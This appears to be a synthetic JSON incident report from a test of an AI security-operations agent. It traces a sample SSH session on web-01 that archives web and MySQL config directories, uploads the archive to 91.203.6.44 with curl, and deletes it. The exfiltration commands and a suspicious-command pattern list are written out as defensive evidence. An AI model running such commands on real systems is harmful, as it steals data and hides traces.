@@ -1,0 +1,304 @@
+{
+  "incident_id": "CONSISTENCY-TEST-05",
+  "investigation_id": "INV-CONSISTENCY-TEST-05-20260927-001",
+  "investigation_status": "COMPLETE",
+  "timestamp": "2026-09-27T05:21:00Z",
+  "initial_seed": {
+    "incident_id": "CONSISTENCY-TEST-05",
+    "detection_source": "llm_triage",
+    "trigger_time": "2026-09-14T20:30:00+00:00",
+    "trigger_description": "정상 인증된 SSH 세션에서 민감 디렉터리 압축 및 외부 서버로의 대용량 데이터 전송 발생",
+    "confidence_initial": 0.6,
+    "severity_hint": "CRITICAL",
+    "priority": 1,
+    "host": "web-01",
+    "src_ip": "91.203.6.44",
+    "reasoning": "정상 인증 이후 민감 디렉터리를 압축하고 외부 서버로 대용량 전송한 뒤 흔적을 삭제하려는 정황이 확인되어 데이터 유출 가능성이 높습니다."
+  },
+  "raw_refs": [
+    "sample_network_recent.log:33",
+    "sample_auth.log:502",
+    "sample_audit.log:511",
+    "sample_audit.log:512",
+    "sample_audit.log:513",
+    "sample_audit.log:514",
+    "sample_audit.log:515",
+    "sample_audit.log:516"
+  ],
+  "raw_ref_locations": {
+    "sample_network_recent.log:33": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_network_recent.log:33"
+    ],
+    "sample_auth.log:502": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_auth.log:502"
+    ],
+    "sample_audit.log:511": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_audit.log:511"
+    ],
+    "sample_audit.log:512": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_audit.log:512"
+    ],
+    "sample_audit.log:513": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_audit.log:513"
+    ],
+    "sample_audit.log:514": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_audit.log:514"
+    ],
+    "sample_audit.log:515": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_audit.log:515"
+    ],
+    "sample_audit.log:516": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/sample_logs/sample_audit.log:516"
+    ]
+  },
+  "provenance": {
+    "status": "passed",
+    "raw_ref_count": 8,
+    "seed_raw_refs": [],
+    "evidence_without_raw_refs": [],
+    "empty_result_evidence": [],
+    "ambiguous_raw_refs": {},
+    "issues": []
+  },
+  "hypothesis": {
+    "title": "민감 데이터 압축 및 외부 유출",
+    "description": "정상 인증된 세션을 통해 민감 디렉터리를 압축하고 외부 서버로 대용량 데이터를 전송함.",
+    "confidence_initial": 0.6
+  },
+  "evidence_chain": [
+    {
+      "sequence": 1,
+      "time": "2026-09-14T20:30:26.000000Z",
+      "layer": "network",
+      "event_type": "alert",
+      "description": "외부 IP 91.203.6.44로 향하는 대용량 데이터 전송 경보(ET POLICY Large Outbound Data Transfer to Uncategorized Host)가 관측됨.",
+      "evidence_id": "EVID-011",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.2,
+      "source_log": "sample_network_recent.log:33",
+      "raw_ref": "sample_network_recent.log:33",
+      "raw_refs": [
+        "sample_network_recent.log:33"
+      ],
+      "empty_result_call": null
+    },
+    {
+      "sequence": 2,
+      "time": "2026-09-14T20:30:00.000Z",
+      "layer": "auth",
+      "event_type": "ssh_accepted",
+      "description": "src_ip 91.203.6.44에서 사용자 ubuntu가 ED25519 공개키 방식으로 SSH 로그인에 성공함 (sshd pid 9700).",
+      "evidence_id": "EVID-012",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.1,
+      "source_log": "sample_auth.log",
+      "raw_ref": "sample_auth.log:502",
+      "raw_refs": [
+        "sample_auth.log:502"
+      ],
+      "empty_result_call": null
+    },
+    {
+      "sequence": 3,
+      "time": "2026-09-14T20:30:05.001Z",
+      "layer": "process",
+      "event_type": "exec",
+      "description": "사용자 ubuntu가 세션(pid 9700)에서 tar 명령으로 민감 디렉터리 압축 수행: tar -czf /tmp/site_backup.tar.gz /var/www/ /etc/mysql/",
+      "evidence_id": "EVID-013",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.15,
+      "source_log": "sample_audit.log",
+      "raw_ref": "sample_audit.log:511",
+      "raw_refs": [
+        "sample_audit.log:511",
+        "sample_audit.log:512"
+      ],
+      "empty_result_call": null
+    },
+    {
+      "sequence": 4,
+      "time": "2026-09-14T20:30:20.001Z",
+      "layer": "process",
+      "event_type": "exec",
+      "description": "사용자 ubuntu가 세션(pid 9700)에서 curl 명령으로 외부 서버에 압축 파일 전송: curl -T /tmp/site_backup.tar.gz http://91.203.6.44/upload",
+      "evidence_id": "EVID-014",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.2,
+      "source_log": "sample_audit.log",
+      "raw_ref": "sample_audit.log:513",
+      "raw_refs": [
+        "sample_audit.log:513",
+        "sample_audit.log:514"
+      ],
+      "empty_result_call": null
+    },
+    {
+      "sequence": 5,
+      "time": "2026-09-14T20:30:45.001Z",
+      "layer": "process",
+      "event_type": "exec",
+      "description": "사용자 ubuntu가 세션(pid 9700)에서 rm 명령으로 임시 압축 파일 삭제: rm -f /tmp/site_backup.tar.gz",
+      "evidence_id": "EVID-015",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.05,
+      "source_log": "sample_audit.log",
+      "raw_ref": "sample_audit.log:515",
+      "raw_refs": [
+        "sample_audit.log:515",
+        "sample_audit.log:516"
+      ],
+      "empty_result_call": null
+    }
+  ],
+  "contradicting_evidence": [],
+  "attack_timeline": [
+    {
+      "time": "2026-09-14T20:30:00Z",
+      "event": "외부 IP 91.203.6.44에서 사용자 ubuntu가 SSH 공개키 로그인 성공 (pid: 9700)",
+      "source": "91.203.6.44"
+    },
+    {
+      "time": "2026-09-14T20:30:05.001Z",
+      "event": "민감 디렉터리 압축 수행 (tar -czf /tmp/site_backup.tar.gz /var/www/ /etc/mysql/)",
+      "source": "ubuntu"
+    },
+    {
+      "time": "2026-09-14T20:30:20.001Z",
+      "event": "압축 파일 외부 서버 전송 (curl -T /tmp/site_backup.tar.gz http://91.203.6.44/upload)",
+      "source": "ubuntu"
+    },
+    {
+      "time": "2026-09-14T20:30:26.000Z",
+      "event": "대용량 데이터 외부 전송 네트워크 경보 발생 (ET POLICY Large Outbound Data Transfer)",
+      "source": "91.203.6.44"
+    },
+    {
+      "time": "2026-09-14T20:30:45.001Z",
+      "event": "임시 압축 파일 삭제 (rm -f /tmp/site_backup.tar.gz)",
+      "source": "ubuntu"
+    }
+  ],
+  "confidence_progression": [
+    {
+      "stage": "initial",
+      "confidence": 0.6,
+      "reason": "정상 인증된 SSH 세션에서 민감 디렉터리 압축 및 외부 서버로의 대용량 데이터 전송 발생"
+    },
+    {
+      "stage": "after_tool_1",
+      "confidence": 0.8,
+      "reason": "외부 IP 91.203.6.44로 향하는 대용량 데이터 전송 경보(ET POLICY Large Outbound Data Transfer to Uncategorized Host)가 관측됨."
+    },
+    {
+      "stage": "after_tool_2",
+      "confidence": 0.9,
+      "reason": "src_ip 91.203.6.44에서 사용자 ubuntu가 ED25519 공개키 방식으로 SSH 로그인에 성공함 (sshd pid 9700)."
+    },
+    {
+      "stage": "after_tool_3",
+      "confidence": 1.0,
+      "reason": "사용자 ubuntu가 세션(pid 9700)에서 tar 명령으로 민감 디렉터리 압축 수행: tar -czf /tmp/site_backup.tar.gz /var/www/ /etc/mysql/"
+    },
+    {
+      "stage": "after_tool_3",
+      "confidence": 1.0,
+      "reason": "사용자 ubuntu가 세션(pid 9700)에서 curl 명령으로 외부 서버에 압축 파일 전송: curl -T /tmp/site_backup.tar.gz http://91.203.6.44/upload"
+    },
+    {
+      "stage": "after_tool_3",
+      "confidence": 1.0,
+      "reason": "사용자 ubuntu가 세션(pid 9700)에서 rm 명령으로 임시 압축 파일 삭제: rm -f /tmp/site_backup.tar.gz"
+    }
+  ],
+  "final_verdict": {
+    "verdict": "THREAT_CONFIRMED",
+    "confidence": 0.95,
+    "severity": "CRITICAL",
+    "attack_type": "Sensitive Data Compression and Exfiltration",
+    "affected_systems": [
+      "web-01"
+    ],
+    "summary": "인증된 SSH 세션을 통해 시스템의 민감 디렉터리가 압축되어 외부 서버로 유출된 후 흔적 삭제 행위가 확인되었습니다.",
+    "reasoning": "인증 로그를 통해 SSH 로그인 성공 정황을 확인하였고, audit 로그를 통해 민감 경로(/var/www/, /etc/mysql/) 압축 및 curl을 이용한 외부 유출 명령 수행 내역을 확보하였으며, network 로그의 대용량 전송 경보와 상호 대조하여 데이터 유출 행위를 최종 확인했습니다."
+  },
+  "tools_called": [
+    {
+      "sequence": 1,
+      "tool_name": "fetch_network_log",
+      "input": {
+        "host": "web-01",
+        "start_time": "2026-09-14T20:00:00Z",
+        "end_time": "2026-09-14T21:00:00Z",
+        "ip": "91.203.6.44",
+        "limit": 20
+      },
+      "result_count": 1,
+      "result_summary": "web-01의 2026-09-14T20:00:00Z~2026-09-14T21:00:00Z 구간에서 조건에 맞는 네트워크 이벤트 총 1건 중 0~0번째 1건 반환. (더 없음, http 이벤트는 url/method/status/xff까지 포함, 1차 탐지팀 공통 정규화 함수 사용) [조회 구간 전체 집계] 이벤트 1건(실제 기록 시각 2026-09-14T20:30:26.000000Z~2026-09-14T20:30:26.000000Z), 종류별: alert 1건, alert signature: ET POLICY Large Outbound Data Transfer to Uncategorized Host 1건, http 상태코드 계열: -, http 상위 경로: -, 목적지 상위: 91.203.6.44:80 1건",
+      "raw_refs": [
+        "sample_network_recent.log:33"
+      ],
+      "queried_layers": []
+    },
+    {
+      "sequence": 2,
+      "tool_name": "fetch_auth_log",
+      "input": {
+        "host": "web-01",
+        "start_time": "2026-09-13T20:30:00Z",
+        "end_time": "2026-09-14T21:30:00Z",
+        "src_ip": "91.203.6.44"
+      },
+      "result_count": 1,
+      "result_summary": "web-01의 2026-09-13T20:30:00Z~2026-09-14T21:30:00Z 구간에서 조건에 맞는 인증 이벤트 총 1건 중 0~0번째 1건 반환. (더 없음, event/result까지 구조화, 1차 탐지팀 공통 정규화 함수 사용) [조회 구간 전체 집계] 로그인 실패 0회(ssh_failed+ssh_invalid_user 기준), 실패 대상 계정 0개(-), 로그인 성공 1회. event별: ssh_accepted 1건",
+      "raw_refs": [
+        "sample_auth.log:502"
+      ],
+      "queried_layers": []
+    },
+    {
+      "sequence": 3,
+      "tool_name": "fetch_audit_log",
+      "input": {
+        "host": "web-01",
+        "start_time": "2026-09-14T20:00:00Z",
+        "end_time": "2026-09-14T21:30:00Z",
+        "ppid": 9700
+      },
+      "result_count": 3,
+      "result_summary": "web-01의 2026-09-14T20:00:00Z~2026-09-14T21:30:00Z 구간에서 조건에 맞는 audit 이벤트 총 3건 중 0~2번째 3건 반환. (더 없음, uid/euid/session_type/exec_args까지 구조화, 1차 탐지팀 공통 정규화 함수 사용) [조회 구간 전체 집계] 이벤트 3건(실제 기록 시각 2026-09-14T20:30:05.001Z~2026-09-14T20:30:45.001Z), 실행 계정별: ubuntu 3건, 명령별: tar 1건, curl 1건, rm 1건. [후속 침해 확인] 웹 서버 계정(www-data/apache/nginx/http) 실행 0건 중 셸·의심 명령 0건, 전체 의심 명령(curl/wget//dev/tcp/crontab 등, EC2 Instance Connect 제외) 1건 — 예: ubuntu: curl -T /tmp/site_backup.tar.gz http://91.203.6.44/upload (sample_audit.log:513). (페이지와 무관한 전체 기준. 0건이 아니면 user나 pid로 다시 조회해 원본을 확인하십시오) [외부 통신 대상] 명령에 등장한 외부 IP: 91.203.6.44 — 다운로드·전송·역방향 셸 대상일 수 있으니 종료 전에 fetch_network_log(ip=<IP>)로 각각 조회해 경보·통신을 확인하십시오.",
+      "raw_refs": [
+        "sample_audit.log:511",
+        "sample_audit.log:512",
+        "sample_audit.log:513",
+        "sample_audit.log:514",
+        "sample_audit.log:515",
+        "sample_audit.log:516"
+      ],
+      "queried_layers": []
+    }
+  ],
+  "statistics": {
+    "tool_calls_count": 3,
+    "tool_calls_max": 8,
+    "confidence_increase": 0.4,
+    "investigation_confidence": 1.0,
+    "evidence_count": 5,
+    "contradicting_evidence_count": 0,
+    "termination_reason": "confidence_sufficient"
+  },
+  "remaining_unknowns": [],
+  "investigation_notes": [
+    "시스템 사전 조회: seed의 src_ip(91.203.6.44)가 출발지 또는 목적지인 network 이벤트를 2026-09-14T20:00:00Z~2026-09-14T21:00:00Z 구간에서 fetch_network_log로 자동 조회했습니다.",
+    "신뢰도 임계값 도달 — 다음 사이클에서 종료 여부 재확인 필요"
+  ]
+}
